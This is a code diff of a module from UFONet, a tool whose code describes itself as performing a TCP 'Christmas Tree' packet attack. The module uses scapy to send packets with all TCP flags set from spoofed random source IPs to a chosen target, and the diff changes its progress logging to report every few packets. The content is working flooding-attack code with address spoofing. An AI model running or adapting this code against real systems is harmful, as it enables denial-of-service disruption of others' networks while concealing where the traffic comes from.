@@ -11,7 +11,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
 
-from core.mods.mod_config import XMAS_SPEED
+from core.mods.mod_config import REPORT_PER_ATTACK, XMAS_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -21,6 +21,7 @@ try:
 except:
     print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
     sys.exit(2)
+
 
 # UFONet TCP 'Christmas Tree' packet attack (XMAS)
 def randIP():
@@ -33,6 +34,7 @@ def randInt():
 
 def xmasize(ip, sport, rounds, source = None):
     n=0
+    xmas_sent = 0
     try:
         for x in range (0,int(rounds)):
             n=n+1
@@ -43,10 +45,10 @@ def xmasize(ip, sport, rounds, source = None):
             IP_p.src = randIP()
 
             if source is None:
-                print("[Info] [XMAS] Using random source IP")
+                # print("[Info] [XMAS] Using random source IP")
                 IP_p.src = randIP()
             else:
-                print("[Info] [XMAS] Using given source IP")
+                # print("[Info] [XMAS] Using given source IP")
                 IP_p.src = source
 
             try:
@@ -62,7 +64,10 @@ def xmasize(ip, sport, rounds, source = None):
             TCP_l.flags = "UFP" # ALL FLAGS SET (like a XMAS tree)
             try:
                 send(IP_p/TCP_l, verbose=0)
-                print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
+                # print("[Info] [AI] [XMAS] Firing 'ionized quartz' ["+str(n)+"] -> [IONIZING!]")
+                xmas_sent += 1
+                if xmas_sent % REPORT_PER_ATTACK == 0:
+                    print("[Info] [AI] [XMAS] Fired 'ionized quartz' ["+str(xmas_sent)+"]")
                 time.sleep(1/XMAS_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [XMAS] Failed to engage with 'ionized quartz' ["+str(n)+"]")
